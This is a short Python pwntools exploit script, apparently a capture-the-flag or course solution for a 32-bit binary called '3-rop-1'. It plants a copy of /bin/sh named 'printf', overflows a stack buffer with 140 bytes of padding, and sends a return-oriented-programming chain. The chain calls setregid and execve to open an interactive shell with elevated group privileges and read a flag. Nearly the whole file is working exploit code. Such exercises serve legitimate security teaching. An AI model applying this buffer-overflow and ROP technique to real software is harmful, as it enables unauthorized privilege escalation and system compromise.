#!/usr/bin/env python
#@author: Ramin Nourbakhsh

from pwn import *
from shutil import copyfile
import subprocess
context.arch = "i386"

#set up printf file so its a symlink to /bin/sh and make the file executable
copyfile('/bin/sh', './printf', follow_symlinks=True)
subprocess.run(['chmod', '+x', './printf'])

e = ELF('./3-rop-1')

p = e.process()

libc = e.libc

#get plt addresses for libc functions that we know exist
setregid_addr = e.symbols['setregid']
execve_addr = e.symbols['execve']


#offset of 'printf' string in elf 
bin = int('0x08048294',16) #found using: $ROPgadget --binary 3-rop-1 --string printf



#ROP gadgets
pop2_inst = int('0x080486ca', 16) #pop; pop; ret;
pop_inst = 0 #junk return

padding = 140 #distance to return address


#ROPchain
payload = flat(
b'A' * (padding)
+ p32(setregid_addr) + p32(pop2_inst) +  p32(60003) + p32(60003)  #setregid(60003, 60003)
+ p32(execve_addr) + p32(pop_inst) + p32(bin) + p32(0) + p32(0) #execve(binsh, 0, 0)
)



print(p.recv())
p.sendline(payload)
p.interactive()
#run cat flag